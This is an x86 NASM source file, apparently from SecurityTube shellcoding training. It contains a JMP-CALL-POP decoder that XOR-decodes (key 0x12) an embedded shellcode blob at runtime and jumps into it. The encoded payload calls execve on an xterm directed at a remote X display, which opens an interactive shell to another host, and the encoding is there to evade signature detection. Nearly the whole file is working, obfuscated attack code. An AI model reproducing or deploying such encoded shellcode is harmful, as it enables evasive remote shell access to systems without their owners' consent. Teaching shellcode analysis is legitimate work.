; Filename: xor-decoder.nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com 
;
;
; Purpose: 

global _start			

section .text
_start:

	jmp short call_decoder

decoder:
	pop esi
	xor ecx, ecx
	mov cl,72


decode:
	xor byte [esi], 0x12
	inc esi
	loop decode

	jmp short Shellcode



call_decoder:

	call decoder
	Shellcode: db 0x23,0xd2,0x23,0xc0,0x23,0xe4,0x23,0xdb,0x42,0x7a,0x23,0x28,0x23,0x22,0x7a,0x23,0x3c,0x23,0x3c,0x7a,0x23,0x20,0x25,0x3c,0x9b,0xf4,0x42,0x7a,0x62,0x7e,0x73,0x6b,0x7a,0x3f,0x76,0x7b,0x61,0x9b,0xf5,0x42,0x7a,0x66,0x77,0x60,0x7f,0x7a,0x7b,0x7c,0x3d,0x6a,0x7a,0x61,0x60,0x3d,0x70,0x7a,0x3d,0x3d,0x3d,0x67,0x9b,0xf1,0x42,0x44,0x45,0x41,0x9b,0xf3,0xa2,0x19,0xdf,0x92
